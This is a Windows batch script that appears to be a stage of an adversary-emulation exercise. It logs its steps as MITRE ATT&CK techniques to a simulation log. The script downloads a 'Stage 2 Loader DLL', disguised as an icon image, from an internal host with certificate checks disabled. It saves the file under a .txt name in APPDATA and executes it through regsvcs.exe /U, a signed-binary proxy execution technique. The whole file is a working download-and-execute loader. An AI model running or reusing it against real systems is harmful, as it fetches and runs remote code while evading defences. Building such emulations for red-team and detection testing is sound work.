@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET fgh=%APPDATA%\11065\c7c9e585
SET jkl=8974269b.txt
SET qwe=https://10.0.0.49/stage/2/icon.png?11065-7
SET rty=ITZEL-S2BO
SET uio=11065
SET asd=7
SET zxc=%PUBLIC%\\macula-simulations.log

REM Cache timestamp
SET tsvar=!DATE!/!TIME!

REM ------------------------------------------------------------
REM Step 1: Heartbeat fetch – download Stage 2 Loader DLL
REM ------------------------------------------------------------
echo [!tsvar!][DEBUG][!rty!][!uio!]: heartbeat_start>> "!zxc!" 2>nul

curl -k -s -o "!fgh!\!jkl!" "!qwe!" 2>nul
SET dl_ev=%ERRORLEVEL%
SET dl_result=OK
SET dl_err=
IF !dl_ev! NEQ 0 (
    SET dl_result=FAIL
    SET dl_err=download_failed
)

echo [!tsvar!][DEBUG][!rty!][!uio!]: heartbeat_complete>> "!zxc!" 2>nul

REM Log T1027 – Obfuscated Files or Information
IF "!dl_result!"=="OK" (
    echo [!tsvar!][TTP][!rty!][!uio!]: T1027^^|Obfuscated Files or Information=OK:>> "!zxc!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!rty!][!uio!]: T1027^^|Obfuscated Files or Information=FAIL:!dl_err!>> "!zxc!" 2>nul
)

REM ------------------------------------------------------------
REM Step 2: Change working directory to output directory
REM ------------------------------------------------------------
echo [!tsvar!][DEBUG][!rty!][!uio!]: chdir_start>> "!zxc!" 2>nul

cd /d "!fgh!" 2>nul
SET cd_ev=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!rty!][!uio!]: chdir_result=!cd_ev!>> "!zxc!" 2>nul

REM ------------------------------------------------------------
REM Step 3: Invoke Stage 2 Loader via regsvcs.exe /U
REM ------------------------------------------------------------
echo [!tsvar!][DEBUG][!rty!][!uio!]: regsvcs_start>> "!zxc!" 2>nul

%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!jkl!" >NUL 2>&1
SET rs_ev=%ERRORLEVEL%
SET rs_result=OK
SET rs_err=
IF !rs_ev! NEQ 0 (
    SET rs_result=FAIL
    SET rs_err=regsvcs_failed
)

echo [!tsvar!][DEBUG][!rty!][!uio!]: regsvcs_result=!rs_ev!>> "!zxc!" 2>nul

REM Log T1218 – System Binary Proxy Execution
IF "!rs_result!"=="OK" (
    echo [!tsvar!][TTP][!rty!][!uio!]: T1218^^|System Binary Proxy Execution=OK:>> "!zxc!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!rty!][!uio!]: T1218^^|System Binary Proxy Execution=FAIL:!rs_err!>> "!zxc!" 2>nul
)

ENDLOCAL
exit /b 0